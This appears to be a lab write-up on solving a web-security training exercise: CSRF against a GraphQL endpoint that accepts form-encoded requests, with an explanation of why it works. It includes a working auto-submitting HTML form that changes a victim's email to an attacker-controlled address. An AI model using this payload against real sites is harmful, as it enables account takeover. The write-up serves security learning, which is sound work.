
## Lab 5: Performing CSRF Exploits over GraphQL
 
**Technique:** CSRF against a GraphQL mutation endpoint accepting form-encoded requests
**Target:** Change victim's email address
**Status:** Solved
 
### Context
 
CSRF works when a browser automatically sends credentials with cross-origin requests. Most GraphQL endpoints accept `application/json` which browsers will not send automatically as a cross-origin form submission. But some endpoints also accept `application/x-www-form-urlencoded`, which browsers will send automatically. If the GraphQL endpoint accepts form-encoded requests and does not validate the CSRF token or check the origin, a forged form submission from an attacker's page will be processed with the victim's session.
 
### What I Did
 
I logged in to my account and changed my email address. Intercepted the request and saw it was a GraphQL mutation with `Content-Type: application/json`. I sent it to Repeater and changed the Content-Type to `application/x-www-form-urlencoded`, URL-encoding the query, operation name, and variables into the body:
 
```
query=mutation+changeEmail...&operationName=changeEmail&variables={"email":"test@test.com"}
```
 
The server accepted it. No CSRF token was required and the origin was not being checked.
 
I used Burp's Generate CSRF PoC feature on the form-encoded version of the request to produce an HTML exploit template. Modified the email value in the template to an attacker-controlled address:
 
```html
<html>
  <body>
    <form action="https://LAB-ID.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="mutation changeEmail($input: ChangeEmailInput!) { changeEmail(input: $input) { email } }">
      <input type="hidden" name="operationName" value="changeEmail">
      <input type="hidden" name="variables" value="{&quot;input&quot;:{&quot;email&quot;:&quot;attacker@evil.com&quot;}}">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```
 
Uploaded this to the exploit server and delivered it to the victim. Their browser loaded the page, auto-submitted the form with their session cookie attached, and the email address was changed.
 
### Why It Works
 
The GraphQL endpoint accepted `application/x-www-form-urlencoded` which is a simple form content type that browsers will send cross-origin without triggering a preflight check. JSON content type would have required a preflight which would have blocked the cross-origin request unless the server explicitly allowed it. By accepting form encoding the endpoint lost the protection that JSON content type provides against CSRF. Without a CSRF token or origin check there was nothing left to stop the forged submission.
 
